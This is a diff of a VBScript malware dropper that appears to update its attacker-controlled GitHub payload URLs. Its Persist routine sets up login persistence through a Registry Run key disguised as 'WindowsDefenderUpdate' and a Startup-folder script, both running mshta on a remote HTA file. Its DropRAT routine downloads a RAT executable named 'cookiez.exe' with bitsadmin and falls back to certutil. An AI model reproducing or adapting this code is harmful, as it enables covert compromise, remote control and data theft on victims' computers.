@@ -25,7 +25,7 @@ Sub RegrabAll()
 End Sub
 
 Sub Persist()
-    Dim payload: payload = "mshta https://raw.githubusercontent.com/ezemaillolbro-sudo/hta--server/refs/heads/main/file.hta"
+    Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
 
     ' Registry Run â€” fires on every login
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
@@ -36,7 +36,7 @@ Sub Persist()
     ' Startup folder VBS â€” fires on every login
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/ezemaillolbro-sudo/hta--server/refs/heads/main/file.hta"", 0, False"
+    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
     sf.Close
     Set sf = Nothing
 End Sub
@@ -97,8 +97,7 @@ End Sub
 
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
-    Dim dl: dl = "https://github.com/ezemaillolbro-sudo
-/diceonline.app/raw/refs/heads/main/cookiez.exe"
+    Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"
     sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     If Not fso.FileExists(temp) Then
         sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
